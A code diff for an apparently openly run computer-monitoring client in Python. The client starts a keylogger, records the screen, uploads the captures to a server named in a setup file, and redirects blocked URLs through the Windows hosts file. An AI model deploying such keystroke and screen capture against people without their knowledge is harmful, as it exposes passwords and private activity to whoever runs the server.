@@ -14,8 +14,8 @@ from keylogger import start_keylogger
 
 
 username = ""
-url = 'http://127.0.0.1:8000/'
-send_url = url + 'send/'
+def_url = 'http://127.0.0.1:8000/'
+send_url = def_url + 'send/'
 post_requests_not_sent = []
 get_requests_not_sent = []
 
@@ -35,7 +35,7 @@ def send_post(url, files, values):
     connection = True
     while connection and post_requests_not_sent:
         try:
-            requests.get(url + "check/", params={'user': ''})
+            requests.get(def_url + "check/", params={'user': ''})
             url = post_requests_not_sent[0][0]
             files = post_requests_not_sent[0][1]
             values = post_requests_not_sent[0][2]
@@ -53,7 +53,7 @@ def send_get(url, params):
     connection = True
     while connection and get_requests_not_sent:
         try:
-            requests.get(url + "check/", params={'user': ''})
+            requests.get(def_url + "check/", params={'user': ''})
             url = get_requests_not_sent[0][0]
             params = get_requests_not_sent[0][1]
             r = requests.get(url, params=params)
@@ -66,12 +66,11 @@ def send_get(url, params):
 
 def screen_record():
     global username
-    # display screen resolution, get it from your OS settings
-    SCREEN_SIZE = (1920, 1080)
+    SCREEN_SIZE = (pyautogui.size().width, pyautogui.size().height)
     FPS = 20.0
     # define the codec
     fourcc = cv2.VideoWriter_fourcc(*"XVID")
-    # create the video write object]
+    # create the video write object
     time_now = str(int(time()))
     out = cv2.VideoWriter("output" + time_now + "_" + username + ".avi", fourcc, FPS, SCREEN_SIZE)
     end = time() + 20
@@ -124,13 +123,11 @@ def keylogger_send():
 def block_url():
     try:
         r = requests.get(send_url + "blockedurls/", params={'user': username})
-        print(r)
         urls_string = r.text
         urls = urls_string.split("  ")
-        print(urls)
+        print("blocked urls: "+urls)
         if urls[0] == "ok":
             urls = urls[1:]
-            print(urls)
             # Windows host file path
             hostsPath = r"C:\Windows\System32\drivers\etc\hosts"
             redirect = "127.0.0.1"
@@ -161,6 +158,15 @@ def program_run():
 
 def main():
     global username
+    global def_url
+    global send_url
+    if not os.path.exists('setup.txt'):
+        print("please write the server's address in 'setup.txt' file and run again.")
+        return
+    f = open("setup.txt", "r")
+    def_url = f.read()
+    f.close()
+    send_url = def_url + 'send/'
     first = True
     while True:
         if first:
@@ -176,19 +182,22 @@ def main():
         else:
             print("Enter your username: ")
             username_try = input()
-        r = requests.get(url + "check/", params={'user': username_try})
-        if r.text == "ok":
-            print("this computer's data will be in '" + username_try + "' account.")
-            username = username_try
-            f = open("username.txt", "w")
-            f.write(username)
-            f.close()
-            _thread.start_new_thread(start_keylogger, ())
-            print("*")
-            program_run()
-            break
-        else:
-            print("there's not such user '" + username_try + "', please try again. If you have no account register in our site.")
+        try:
+            r = requests.get(def_url + "check/", params={'user': username_try})
+            if r.text == "ok":
+                print("this computer's data will be in '" + username_try + "' account.")
+                username = username_try
+                f = open("username.txt", "w")
+                f.write(username)
+                f.close()
+                _thread.start_new_thread(start_keylogger, ())
+                print("*")
+                program_run()
+                break
+            else:
+                print("there's not such user '" + username_try + "', please try again. If you have no account register in our site.")
+        except requests.exceptions.RequestException as err:
+            print("no connection - try again later", err)
 
 
 if __name__ == '__main__':
